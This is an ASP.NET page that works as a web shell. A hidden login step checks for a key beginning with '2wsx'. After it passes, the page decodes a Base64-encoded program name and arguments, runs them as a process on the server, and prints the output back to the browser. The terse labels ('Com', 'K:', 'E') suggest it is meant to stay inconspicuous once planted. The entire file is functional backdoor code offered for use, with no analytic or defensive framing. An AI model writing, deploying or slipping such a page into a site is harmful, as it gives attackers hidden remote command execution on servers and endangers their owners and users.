<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
  
 void Page_Load()
 {
     id1.Visible = true;
     Div1.Visible = false;
 }
 protected void btnExecute1_Click(object sender, System.EventArgs e)
 {
     string P = "2wsx";string pa = txtAuthKey.Text; string re = pa.Substring(0, 4);
     bool h = Regex.IsMatch(pa, @"^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[~`!@#\$%\^&\*,.])(?!.*\s).*$");
     if (h == false | re != P)
     {
         id1.Visible = false;
     }
     if (h == true & re == P)
     {
         Div1.Visible = true;
         id1.Visible = false;
     }
 
 }
string Exc(string c1, string c2)
{
    try
    {
       byte[] nB = Convert.FromBase64String(c1); string d1 = Encoding.UTF8.GetString(nB);
       byte[] nB2 = Convert.FromBase64String(c2); string d2 = Encoding.UTF8.GetString(nB2);
       ProcessStartInfo ps = new ProcessStartInfo();
       ps.FileName = d1; ps.Arguments = d2;
       ps.RedirectStandardOutput = true; ps.UseShellExecute = false;
       Process p = Process.Start(ps);
       using (StreamReader stmrdr = p.StandardOutput)
       {
           string s = stmrdr.ReadToEnd();
           stmrdr.Close();
           id1.Visible = false;
           return s;
       } 
    }

     catch (Exception ex)
     {
         return ex.ToString();
     }

}

void btnExecute_Click(object sender, System.EventArgs e)
{
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(Exc(txtCommand.Text, txtc.Text)));
    Response.Write("</pre>");
}
</script>


<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>Com</title>
</head>
<body>
    <form id="formCommand" runat="server">
    <div class="header" id="id1" runat="server">
        <table>
            <tr>
                <td width="30">K:</td>
		        <td><asp:TextBox id="txtAuthKey" runat="server"></asp:TextBox></td>
            </tr>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="Button2" runat="server" OnClick="btnExecute1_Click" Text="E" /></td>
            </tr>
        </table>
    </div>
 <div class="header" id="Div1" runat="server">
        <table>
            <tr>
                <td width="30">1:</td>
                <td><asp:TextBox ID="txtCommand" runat="server" Width="300px"></asp:TextBox></td>
            </tr>
            <tr>
                <td width="30">2:</td>
                <td><asp:TextBox ID="txtc" runat="server" Width="300px"></asp:TextBox></td>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="Button1" runat="server" OnClick="btnExecute_Click" Text="E" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>
